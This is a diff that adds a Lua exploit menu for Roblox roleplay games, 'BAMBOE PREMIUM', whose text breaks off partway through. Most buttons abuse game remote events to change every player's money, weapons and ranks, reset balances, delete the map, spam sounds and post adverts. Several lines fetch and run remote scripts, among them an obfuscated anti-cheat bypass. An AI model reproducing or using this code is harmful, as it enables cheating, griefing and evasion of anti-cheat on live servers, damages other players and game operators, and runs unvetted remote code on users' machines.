@@ -1,0 +1,1111 @@
+print("BAMBOE PREMIUM BY dc:bamboe_002 is WORKING")
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("BAMBOE PREMIUM", "GrapeTheme")
+
+local Tab1 = Window:NewTab("KeyBinds")
+local Section1 = Tab1:NewSection("BAMBOE PREMIUM")
+
+Section1:NewKeybind("SET OPEN/CLOSE KEYBIND", "Minimalize", Enum.KeyCode.Insert, function()
+    Library:ToggleUI()
+end)
+
+Section1:NewButton("-- BAMBOE GAAT KK HARD --", "LLLLL", function()
+    print("HAHAHAAHA LLLLL BAMBOE GOATED")
+end)
+
+Section1:NewButton("-- V1.2.6 --", "BAMBOE PREMIUM V1.2.6", function()
+    print("BAMBOE PREMIUM V1.2.6")
+end)
+
+
+local function ActivateESP()
+	for i, v in pairs(game.Players:GetChildren()) do
+		local chr = v.Character
+		if chr:FindFirstChild('q') then
+			continue
+		else
+			local h = Instance.new('Highlight')
+			h.Name = 'q'
+			h.Parent = v.Character
+			h.FillTransparency = 0.3
+			h.OutlineColor = Color3.new(1, 1, 1)
+			h.FillColor = Color3.new(0.121569, 0.101961, 0.678431)
+			local nameLabel = Instance.new("TextLabel")
+			nameLabel.Name = "NameLabel"
+			nameLabel.Parent = h
+			nameLabel.BackgroundTransparency = 1
+			nameLabel.Position = UDim2.new(0, 0, -0.2, 0)
+			nameLabel.Size = UDim2.new(1, 0, 0.2, 0)
+			nameLabel.Font = Enum.Font.SourceSans
+			nameLabel.Text = v.Name
+			nameLabel.TextColor3 = Color3.new(1, 1, 1)
+			nameLabel.TextScaled = true
+			nameLabel.TextSize = 14.0
+			nameLabel.TextWrapped = true
+		end
+	end
+end
+
+local function DeactivateESP()
+	for i, v in pairs(game.Players:GetChildren()) do
+		local chr = v.Character
+		local highlight = chr:FindFirstChild('q')
+		if highlight then
+			highlight:Destroy()
+		end
+	end
+end
+
+
+local Tab = Window:NewTab("BAMBOE PREMIUM")
+local Section2 = Tab:NewSection("BAMBOE PREMIUM")
+local Section3 = Tab:NewSection("BAMBOE PREMIUM")
+
+
+Section3:NewButton("Salaris Trigger [ FIVER V1 ]", "[ FIVER V1 ]", function()
+    game.ReplicatedStorage.Salaris.Geld:FireServer()
+end)
+
+
+
+Section3:NewButton("ESP MENU", "ESP", function()
+    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/MEX5/bamboe-esp/main/bamboe%20esp'))() end)
+end)
+
+Section3:NewButton("10 Mil in PRIVATE server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(10000000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Economy.Bank
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("ATV PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(1, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.InfoAutos.ATV.InBezit
+            }
+        }
+    })
+end
+end)
+
+
+
+Section3:NewButton("9000 Shotgun kofferbak PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(900000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Kofferbak.Remington
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("9000 Skorpions kofferbak PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(900000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Kofferbak.Skorpion
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("9000 Akms kofferbak PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(900000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Kofferbak.AKM
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("9000 Passes kofferbak PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(900000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Kofferbak.Pass
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("1 Akm Inventory PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(1, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Inventory.AKM
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("Politie rank MAX PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(99999999999, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Ranks.Politie
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("Ambulance rank MAX PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(99999999999, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Ranks.Ambulance
+            }
+        }
+    })
+end
+end)
+
+
+Section3:NewButton("Brandweer rank MAX PRIVATE Server [ ATN ]", "[ Amsterdam the netherlands ]", function()
+local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(99999999999, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.Ranks.Brandweer
+            }
+        }
+    })
+end
+end)
+
+
+
+Section3:NewButton("Alle Tools uit de game [ UNIVERSEL ]", "BAMBOE", function()
+    function recurse(instance)
+    if instance:IsA("Tool") or instance:IsA("HopperBin") then
+        print(instance:GetFullName())
+        if workspace.FilteringEnabled == false then
+            c = instance:Clone()
+            c.Parent = game.Players.LocalPlayer.Backpack
+       else
+            instance.Parent = game.Players.LocalPlayer.Backpack
+       end
+    end
+    for _, child in ipairs(instance:GetChildren()) do
+        recurse(child)
+    end
+end
+recurse(game)
+
+end)
+            
+Section3:NewButton("Revive [ FiveR V2 ]", "Revive", function()
+    game:GetService("ReplicatedStorage").Lifepak.Antiexploit:FireServer()
+end)
+
+Section3:NewButton("Infinety Yield [ ADMIN ]", "admin", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Section3:NewButton("Announcement [ DRACHTEN ]", "[ PATCHED ]", function()
+    game.ReplicatedStorage.AnnouncementEvent:FireServer()
+end)
+
+Section3:NewButton("Overhead DSI [ DRACHTEN ]", "[FIXED]", function()
+    game.ReplicatedStorage.Overhead.Verstuur2:FireServer()
+end)
+
+Section3:NewButton("Overhead Burger [ DRACHTEN ]", "[FIXED]", function()
+    game.ReplicatedStorage.Overhead.Verstuur:FireServer()
+end)
+
+Section3:NewButton("server sounds ruinen [ SOMS WERKEND ]", "nuke", function()
+    --sound thingy
+
+--[[
+Made By BAMBOE
+If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
+This Gui is Undetectable
+RespectFilteringEnabled must be false to use it
+--]]
+
+local ScreenGui = Instance.new("ScreenGui")
+local Draggable = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local Time = Instance.new("TextLabel")
+local _1E = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local _3E = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local SE = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local Path = Instance.new("TextLabel")
+local Top = Instance.new("Frame")
+local Top_2 = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local Exit = Instance.new("TextButton")
+local Minizum = Instance.new("TextButton")
+local Stop = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local IY = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local Wait = Instance.new("TextBox")
+
+--Properties:
+
+ScreenGui.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Draggable.Name = "Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ."
+Draggable.Parent = ScreenGui
+Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Draggable.BackgroundTransparency = 1.000
+Draggable.BorderSizePixel = 0
+Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
+Draggable.Size = UDim2.new(0, 438, 0, 277)
+
+Frame.Name = ". . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
+Frame.Parent = Draggable
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
+Frame.Size = UDim2.new(0, 438, 0, 277)
+
+Frame_2.Name = " . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
+Frame_2.Size = UDim2.new(0, 438, 0, 238)
+Frame_2.Active = true
+Frame_2.Draggable = true
+
+Time.Name = "Time"
+Time.Parent = Frame_2
+Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Time.BackgroundTransparency = 1.000
+Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
+Time.Size = UDim2.new(0, 437, 0, 31)
+Time.Font = Enum.Font.GothamSemibold
+Time.Text = "RespectFilteringEnabled(RFE) : nil"
+Time.TextColor3 = Color3.fromRGB(255, 255, 255)
+Time.TextScaled = true
+Time.TextSize = 14.000
+Time.TextWrapped = true
+
+_1E.Name = "1E"
+_1E.Parent = Frame_2
+_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+_1E.BorderSizePixel = 0
+_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
+_1E.Size = UDim2.new(0, 208, 0, 33)
+_1E.Font = Enum.Font.SourceSans
+_1E.Text = "Mute Game"
+_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
+_1E.TextScaled = true
+_1E.TextSize = 30.000
+_1E.TextWrapped = true
+
+UICorner.Parent = _1E
+
+_3E.Name = "3E"
+_3E.Parent = Frame_2
+_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+_3E.BorderSizePixel = 0
+_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
+_3E.Size = UDim2.new(0, 209, 0, 33)
+_3E.Font = Enum.Font.SourceSans
+_3E.Text = "Annoying  Sound"
+_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
+_3E.TextSize = 30.000
+_3E.TextWrapped = true
+
+UICorner_2.Parent = _3E
+
+SE.Name = "SE"
+SE.Parent = Frame_2
+SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+SE.BorderSizePixel = 0
+SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
+SE.Size = UDim2.new(0, 209, 0, 33)
+SE.Font = Enum.Font.SourceSans
+SE.Text = "Kill Sound Service"
+SE.TextColor3 = Color3.fromRGB(255, 255, 255)
+SE.TextSize = 30.000
+SE.TextWrapped = true
+
+UICorner_3.Parent = SE
+
+Path.Name = "Path"
+Path.Parent = Frame_2
+Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Path.BackgroundTransparency = 1.000
+Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
+Path.Size = UDim2.new(0, 435, 0, 44)
+Path.Font = Enum.Font.GothamSemibold
+Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
+Path.TextColor3 = Color3.fromRGB(255, 0, 0)
+Path.TextScaled = true
+Path.TextSize = 14.000
+Path.TextWrapped = true
+
+Top.Name = "Top"
+Top.Parent = Frame_2
+Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
+Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Top.BorderSizePixel = 0
+Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
+Top.Size = UDim2.new(0, 438, 0, 30)
+Top_2.Name = "Top"
+Top_2.Parent = Top
+Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
+Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Top_2.BorderSizePixel = 0
+Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
+Top_2.Size = UDim2.new(0, 438, 0, 5)
+
+ImageLabel.Parent = Top
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
+ImageLabel.Size = UDim2.new(0, 29, 0, 27)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"
+
+TextLabel.Parent = ImageLabel
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 397, 0, 30)
+TextLabel.Font = Enum.Font.GothamSemibold
+TextLabel.Text = "BAMBOE SOUNDS"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextWrapped = true
+
+Exit.Name = "Exit"
+Exit.Parent = Top
+Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Exit.BackgroundTransparency = 1.000
+Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
+Exit.Size = UDim2.new(0, 32, 0, 25)
+Exit.Font = Enum.Font.GothamSemibold
+Exit.Text = "x"
+Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+Exit.TextScaled = true
+Exit.TextSize = 14.000
+Exit.TextWrapped = true
+
+Minizum.Name = "Minizum"
+Minizum.Parent = Top
+Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Minizum.BackgroundTransparency = 1.000
+Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
+Minizum.Size = UDim2.new(0, 32, 0, 23)
+Minizum.Font = Enum.Font.GothamSemibold
+Minizum.Text = "_"
+Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
+Minizum.TextScaled = true
+Minizum.TextSize = 14.000
+Minizum.TextWrapped = true
+
+Stop.Name = "Stop"
+Stop.Parent = Frame_2
+Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Stop.BorderSizePixel = 0
+Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
+Stop.Size = UDim2.new(0, 424, 0, 33)
+Stop.Font = Enum.Font.SourceSans
+Stop.Text = "Stop"
+Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stop.TextSize = 30.000
+Stop.TextWrapped = true
+
+UICorner_4.Parent = Stop
+
+IY.Name = "IY"
+IY.Parent = Frame_2
+IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+IY.BorderSizePixel = 0
+IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
+IY.Size = UDim2.new(0, 209, 0, 33)
+IY.Font = Enum.Font.SourceSans
+IY.Text = "Unmute Game"
+IY.TextColor3 = Color3.fromRGB(255, 255, 255)
+IY.TextScaled = true
+IY.TextSize = 30.000
+IY.TextWrapped = true
+
+UICorner_5.Parent = IY
+
+TextLabel_2.Parent = Frame_2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
+TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
+TextLabel_2.Font = Enum.Font.GothamSemibold
+TextLabel_2.Text = "Wait Speed       :"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 30.000
+TextLabel_2.TextWrapped = true
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+
+Wait.Name = "Wait()"
+Wait.Parent = Frame_2
+Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Wait.BackgroundTransparency = 1.000
+Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
+Wait.Size = UDim2.new(0, 199, 0, 50)
+Wait.ZIndex = 99999
+Wait.ClearTextOnFocus = false
+Wait.Font = Enum.Font.GothamSemibold
+Wait.Text = "0.5"
+Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
+Wait.TextSize = 30.000
+Wait.TextWrapped = true
+
+--Sound Service:
+local notification = Instance.new("Sound")
+notification.Parent = game:GetService("SoundService")
+notification.SoundId = "rbxassetid://9086208751"
+notification.Volume = 5
+notification.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
+
+--funuction:
+Exit.MouseButton1Click:Connect(function()
+	ScreenGui:Destroy()
+end)
+local Mute = false
+IY.MouseButton1Click:Connect(function()
+	Mute = false
+end)
+
+_1E.MouseButton1Click:Connect(function()
+	Mute = true
+	while Mute == true do 
+		wait()
+		for _, sound in next, workspace:GetDescendants() do
+			if sound:IsA("Sound") then
+				sound:Stop()
+			end
+		end
+	end
+end)
+
+_3E.MouseButton1Click:Connect(function()
+	for _, sound in next, workspace:GetDescendants() do
+		if sound:IsA("Sound") then
+			sound:Play()
+		end
+	end
+end)
+
+local Active = true
+SE.MouseButton1Click:Connect(function()
+	Active = true
+	while Active == true do
+		local StringValue = Wait.Text
+		wait(StringValue)
+		for _, sound in next, workspace:GetDescendants() do
+			if sound:IsA("Sound") then
+				sound:Play()
+			end
+		end
+	end
+end)
+
+Stop.MouseButton1Click:Connect(function()
+	Active = false
+end)
+--Credit:
+notification:Play()
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "BAMBOE";
+	Text = "BAMBOE Has Been Loaded , Made By BAMBOE (MEX/BAMBOE)";
+	Icon = "";
+	Duration = 10; 
+	Button1 = "Yes DADDY Bamboe";
+})
+--Check:
+while true do
+	wait(0.5)
+	local setting = game:GetService("SoundService").RespectFilteringEnabled
+	if setting == true then
+		Time.TextColor = BrickColor.new(255,0,0)
+		Time.Text ="RespectFilteringEnabled(RFE) : true"
+	elseif setting == false then
+		Time.Text ="RespectFilteringEnabled(RFE) : false"
+		Time.TextColor = BrickColor.new(0,255,0)
+	end
+end
+end)
+            
+Section3:NewButton("Key Teleporter [SOMS WERKEND]", "tp", function()
+    -- https://v3rmillion.net/showthread.php?tid=1210201
+
+-- //Made by BAMBOE
+getgenv().Keys = {
+"q",
+"e",
+"r",
+"t",
+"y",
+"u",
+"i",
+"o",
+"p",
+"f",
+"g",
+"h",
+"j",
+"k",
+"l",
+"z",
+"x",
+"c",
+"v",
+"b",
+"n",
+"m"
+}
+
+local usedKeys = {}
+
+local function addKeyValueToCharacter(char)
+    local keyValue = Instance.new("StringValue")
+    local randomKey = nil
+
+    repeat
+        randomKey = getgenv().Keys[math.random(1, #getgenv().Keys)]
+    until not usedKeys[randomKey]
+
+    keyValue.Name = "KeyValue"
+    keyValue.Value = randomKey
+    keyValue.Parent = char
+    usedKeys[randomKey] = true
+
+    local billboardGui = Instance.new("BillboardGui")
+    billboardGui.Name = "KeyBillboard"
+    billboardGui.Adornee = char.Head
+    billboardGui.AlwaysOnTop = true
+    billboardGui.LightInfluence = 0
+    billboardGui.Size = UDim2.new(2, 0, 2, 0) 
+    billboardGui.StudsOffset = Vector3.new(0, 3, 0) 
+    billboardGui.Parent = char.Head
+
+    local keyLabel = Instance.new("ImageLabel")
+    keyLabel.BackgroundTransparency = 1
+    keyLabel.Size = UDim2.new(1, 0, 1, 0)
+    keyLabel.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=13045815860&width=420&height=420"
+    keyLabel.Parent = billboardGui
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.BackgroundTransparency = 1
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.Position = UDim2.new(0, 0, -0.05, 0)
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextColor3 = Color3.new(0, 0, 0)
+    textLabel.TextScaled = true
+    textLabel.Text = randomKey:upper()
+    textLabel.Parent = keyLabel
+end
+
+local function checkForNewCharacter(player)
+    if player.Character and player ~= game.Players.LocalPlayer then
+        addKeyValueToCharacter(player.Character)
+    end
+    player.CharacterAdded:Connect(addKeyValueToCharacter)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    checkForNewCharacter(player)
+end)
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    checkForNewCharacter(player)
+end
+
+local userInputService = game:GetService("UserInputService")
+local textInputFocused = false
+
+userInputService.TextBoxFocused:Connect(function()
+    textInputFocused = true
+end)
+
+userInputService.TextBoxFocusReleased:Connect(function()
+    textInputFocused = false
+end)
+
+userInputService.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and not textInputFocused then
+        local keyPressed = input.KeyCode
+
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("KeyValue") then
+                if player.Character.KeyValue.Value == keyPressed.Name:lower() then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+    end
+end)
+end)            
+
+Section3:NewButton("1000000 Bank inspawnen [ Maastricht ]", "geld", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(1000000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Bank
+            }
+        }
+    })
+end
+end)
+
+Section3:NewButton("1000000 KILLS [ ALPHA PLANCKS ]", "KILLS", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(1000000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Kills
+            }
+        }
+    })
+end
+end)
+            
+Section3:NewButton("Antiexploit Uitzetten [ FIXED ]", "anti-sploit", function()
+    local notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/notiflib/main/main"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro2/main/ui2"))()
+local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
+ NotifyLib.prompt('Adonis Anti-Cheat Disabler Bypass', 'bypassed', 1.2)
+ NotifyLib.prompt('Adonis Anti-Cheat Disabler Bypass', 'this only works for games that have adonis in it', 1.2)
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RelkzzRebranded/Bypassed---OBFUSCATED..../main/Adonis%20BYPASS.lua"))()
+end)
+
+Section3:NewButton("Geld inspawnen [ HELMOND RP ]", "Geld", function()
+    game.ReplicatedStorage.Belastingdienst.Belasting:FireServer(-10000000)
+end)
+
+Section3:NewButton("Age UP ACC LEEFTIJD [ SOMS WERKEND ]", "acc leeftijd", function()
+    game.replicatgame.ReplicatedStorage.AgeSystem.AgeUp()
+    game.ReplicatedStorage.AgeSystem.AgeUp:FireServer()
+    game.ReplicatedStorage.AgeSystem.AgeUp:FireClient()
+end)            
+
+Section3:NewButton("Alle wapens [ SLOKS ]", "BAMBOE", function()
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("WAPENS SLOKS/ROTTERDAM", "GrapeTheme")
+
+-- Sloks Roleplay
+local Tab = Window:NewTab("BAMBOE")
+local Section = Tab:NewSection("BAMBOE")
+
+Section:NewButton("Spawn Alle Wapens BAMBOE", "Spawn je wapens in!", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/CriminalMM/gg/main/we'), true))()
+end)
+end)            
+            
+Section3:NewButton("[ BAMBOE GOATED ]", "Twitter", function()
+    local args = {
+            [1] = "Best exploits/map leaks BAMBOE | add bamboe_002 op discord"
+        }
+        
+        game:GetService("ReplicatedStorage").TwitterPost:FireServer(unpack(args))  
+end)
+            
+
+Section3:NewButton("Leeuwarden Geld 5 mil [ PATCHED ]", "money spawnen", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(5000000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Geld
+            }
+        }
+    })
+end
+end)
+
+Section3:NewButton("Leeuwarden Geld reset [ PATCHED ]", "Geld Reset", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(0, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Geld
+            }
+        }
+    })
+end
+end)
+
+Section3:NewButton("GELD RESET [ DEN HAAG ]", "Geld Reset", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(0, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Bank
+            }
+        }
+    })
+end
+end)
+
+Section3:NewButton("1 Mil voor iedereen [ DEN HAAG ]", "Geld 1 mil", function()
+    local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+  
+    game.ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(1000000, {
+        ["ACS_Modulo"] = {
+            ["Variaveis"] = {
+                ["StoredAmmo"] = player.leaderstats.Bank
+            }
+        }
+    })
+end
+end)
+
+Section3:NewButton("All game sounds [ FIXED ]", "FIXED", function()
+    print(game:GetService("SoundService").RespectFilteringEnabled)
+ 
+for _, sound in next, workspace:GetDescendants() do
+   if sound:IsA("Sound") then
+       sound:Play()
+   end
+end
+end)
+
+
+Section3:NewButton("Heli spawn [ FIVER V2 ]", "heli spawnen", function()
+    game:GetService("Workspace").Bell206BRegen.Regen.Spawn:FireServer()
+end)
+
+Section3:NewButton("Map Verwijderen [ ATN ]", " [ Amsterdam The Netherlands ]", function()
+    local cFrame = CFrame.new(0,0,0)
+
+
+local Size = {
+  X = 100000000000000000000000000,
+  Y = 100000000000000000000000000,
+  Z = 100000000000000000000000000
+}
+
+game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
+end)
+
+Section3:NewButton("GodMode [ ATN ]", " [ Amsterdam The Netherlands ]", function()
